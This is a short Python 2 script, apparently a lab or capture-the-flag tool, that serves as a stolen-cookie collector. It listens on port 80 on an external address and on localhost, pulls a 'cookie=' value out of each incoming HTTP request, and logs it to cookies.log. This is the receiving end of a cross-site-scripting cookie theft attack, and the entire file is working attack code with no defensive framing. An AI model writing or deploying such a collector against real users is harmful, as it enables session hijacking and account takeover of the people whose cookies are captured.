#!/usr/bin/python

import re
import sys
import threading
import SocketServer

address='192.169.1.1'
address_local='localhost'
port = 80

cookie_re_raw='cookie=(.+?) HTTP/1.[0|1]'
cookie_re = re.compile(cookie_re_raw)

cookie_jar = "cookies.log"

class CookieMonster(SocketServer.BaseRequestHandler):
  def __init__(self, request, client_address, server):
    SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
    return

  def setup(self):
    return SocketServer.BaseRequestHandler.setup(self)

  def handle(self):
    data = self.request.recv(2048)
    print("Received data:\n{}".format(data))

    m = cookie_re.search(data)
    cookie = "no cookie"
    if m is None:
      print("No cookie provided in request")
      self.request.send("no cookies :(\n")
    else:
      with open(cookie_jar, "a") as f:
        print("Cookie found in request!")
        print("cookie: {}".format(m.group(1)))
        f.write("{}\n".format(m.group(1)))
        cookie = m.group(1)

    self.request.send(cookie + "\n")
    return

  def finish(self):
    return SocketServer.BaseRequestHandler.finish(self)

if __name__ == '__main__':
  if len(sys.argv) > 1:
    port = int(sys.argv[1])

  print("Starting collector on (addr={}, port={})".format(address, port))

  # Listen on the external interface
  server = SocketServer.TCPServer((address, port), CookieMonster)
  t = threading.Thread(target=server.serve_forever)
  t.setDaemon(True)
  t.start()

  print("Starting collector on (addr={}, port={})".format(address_local, port))
  # Listen on localhost
  server = SocketServer.TCPServer((address_local, port), CookieMonster)
  server.serve_forever()
